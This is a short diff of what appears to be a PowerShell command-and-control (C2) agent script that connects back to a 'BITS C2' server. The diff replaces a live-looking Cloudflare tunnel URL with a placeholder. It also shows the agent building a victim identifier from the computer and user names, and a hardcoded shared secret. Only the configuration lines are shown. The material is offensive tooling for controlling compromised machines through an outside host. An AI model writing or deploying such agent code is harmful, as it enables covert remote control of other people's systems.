@@ -2,7 +2,7 @@
 # Connects to main.py BITS C2 integration on port 8000
 # Uses HTTP + HMAC-SHA256 authentication
 
- $ServerUrl = "https://attention-launches-kind-commonly.trycloudflare.com/bits"
+ $ServerUrl = "https://CHANGE-MECHANGE-ME.trycloudflare.com/bits"
 $AgentId = $env:COMPUTERNAME + "_" + $env:USERNAME
 $SecretKey = "c2-agent-k3y-2024-s3cr3t"
 
